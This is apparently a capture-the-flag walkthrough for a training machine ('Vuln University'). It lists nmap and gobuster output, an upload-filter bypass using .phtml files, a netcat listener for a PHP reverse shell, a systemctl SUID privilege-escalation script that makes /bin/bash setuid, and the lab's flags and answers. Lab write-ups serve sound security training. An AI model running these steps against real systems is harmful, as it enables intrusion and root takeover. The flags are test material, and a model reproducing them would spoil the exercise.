# ran nmap -A 10.10.30.236 to find open ports and results:

Nmap scan report for 10.10.30.236
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# What version of the squid proxy is running on the machine?
3.5.12

# Using the nmap flag -n what will it not resolve?
DNS

# What is the most likely operating system this machine is running?
Ubuntu

# What port is the web server running on?
3333

# ran gobuster dir -u http://10.10.30.236:3333 -w /usr/share/wordlists/dirb/big.txt -t 250 and results:

/css                  (Status: 301) [Size: 317] [--> http://10.10.30.236:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.30.236:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.30.236:3333/images/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.30.236:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.30.236:3333/js/]      
/server-status        (Status: 403) [Size: 302]             


# Try upload a few file types to the server, what common extension seems to be blocked?
.php

# created a wordlist in Burp Suite with php extentions
.php
.php3
.php4
.php5
.phtml

#Intercepted the traffic in Burp Suite after uploading a php-reverse shell file to http://10.10.30.236:3333/internal and sent the results to Intruder. Added the wordlist in Payload's options, and selected Sniper as the attack.  Next, selected the filename extension .php in the intercept and clicked on Add §.
Results, .phtml files are now allowed to be uploaded to http://10.10.30.236:3333/internal/

# setup a nc -lvnp 4444 before opening the shell from http://10.10.30.236:3333/internal/uploads to gain access

# What is the name of the user who manages the webserver?
Bill

# Flag
8bd7992fbe8a6ad22a63361004cfcedb

# To find the SUID files, ran $ find . -perm /4000 2>/dev/null.  On the system, search for all SUID files. What file stands out?
/bin/systemctl

# To gain root access, used the systemctl binary:
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

# Lastly, used bash -p to switch to root user.  Flag in root.txt:
a58ff8579f0a9270368d33a9966c7fd5
